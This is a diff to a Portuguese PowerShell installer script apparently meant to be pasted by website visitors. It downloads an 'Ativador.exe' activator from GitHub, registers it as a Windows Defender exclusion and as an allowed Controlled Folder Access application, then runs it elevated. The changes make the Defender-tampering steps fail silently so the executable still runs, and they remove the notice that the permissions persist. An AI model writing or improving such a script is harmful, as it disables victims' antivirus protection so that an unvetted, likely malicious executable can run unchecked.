@@ -1,5 +1,5 @@
 # PowerShell 5.1 ou superior, Windows. Publicar como texto, sem HTML.
-# Site v12: exclusao do EXE antes do download; acesso a pastas apos SHA256.
+# Site v18: tenta configurar Defender; falhas nessa etapa nao interrompem instalacao.
 & {
     $ErrorActionPreference = 'Stop'
     $ExecutableUrl = 'https://github.com/forcewarltda-crypto/Ativador-.exe/releases/download/v5.0.0.8/Ativador.exe'
@@ -54,6 +54,7 @@ function Invoke-FWAdminStep {
         (Split-Path -Leaf (Split-Path -Parent $exe)) -notmatch '^ForceWar-Download-[a-f0-9]{32}$') { throw 'Destino do download invalido.' }
     if (Test-Path -LiteralPath $exe) { throw 'O destino ja existe. Nenhum arquivo sera sobrescrito.' }
 
+    try {
     $prefs = Get-MpPreference -ErrorAction Stop
     if (-not (Test-FWExclusion $prefs.ExclusionPath $exe)) {
         Add-MpPreference -ExclusionPath $exe -ErrorAction Stop
@@ -64,7 +65,9 @@ function Invoke-FWAdminStep {
         if (Test-FWExclusion $prefs.ExclusionPath $exe) { $confirmed = $true; break }
         Start-Sleep -Milliseconds 500
     }
-    if (-not $confirmed) { throw 'O Defender nao confirmou a exclusao do EXE. O download nao foi iniciado.' }
+    if (-not $confirmed) { throw 'O Defender nao confirmou a exclusao do EXE. A instalacao continuara.' }
+
+    } catch { Write-Host 'Exclusao do Defender nao confirmada; continuando a instalacao.' }
 
     $previousTls = [Net.ServicePointManager]::SecurityProtocol
     $created = $false
@@ -89,6 +92,7 @@ function Invoke-FWAdminStep {
         if ((Get-FileHash -LiteralPath $exe -Algorithm SHA256 -ErrorAction Stop).Hash -ine $ExpectedSha256) {
             throw 'O Executor mudou depois da verificacao. Abertura cancelada.'
         }
+        try {
         $prefs = Get-MpPreference -ErrorAction Stop
         if (-not (Test-FWExclusion $prefs.ControlledFolderAccessAllowedApplications $exe)) {
             Add-MpPreference -ControlledFolderAccessAllowedApplications $exe -ErrorAction Stop
@@ -103,8 +107,9 @@ function Invoke-FWAdminStep {
             Start-Sleep -Milliseconds 500
         }
         if (-not $folderAccessConfirmed) {
-            throw 'O Defender nao confirmou a permissao do EXE no Acesso controlado a pastas. Abertura cancelada.'
+            throw 'O Defender nao confirmou a permissao do EXE no Acesso controlado a pastas. A instalacao continuara.'
         }
+        } catch { Write-Host 'Permissao de acesso a pastas nao confirmada; continuando a instalacao.' }
         # A espera pela permissao pode levar alguns segundos; reconfere o arquivo antes de abrir.
         $null = Assert-FWLocalPath $exe
         if ((Get-FileHash -LiteralPath $exe -Algorithm SHA256 -ErrorAction Stop).Hash -ine $ExpectedSha256) {
@@ -144,7 +149,7 @@ Invoke-FWAdminStep
         }
         catch { throw 'O Windows nao iniciou a etapa administrativa. A solicitacao pode ter sido cancelada ou bloqueada.' }
         if ($started.ExitCode -ne 0) {
-            throw 'Falha na etapa administrativa: exclusao, download, integridade, acesso a pastas ou abertura. Permissoes ja aplicadas podem permanecer.'
+            throw 'Falha na etapa administrativa: download, integridade ou abertura do executavel.'
         }
     }
 }
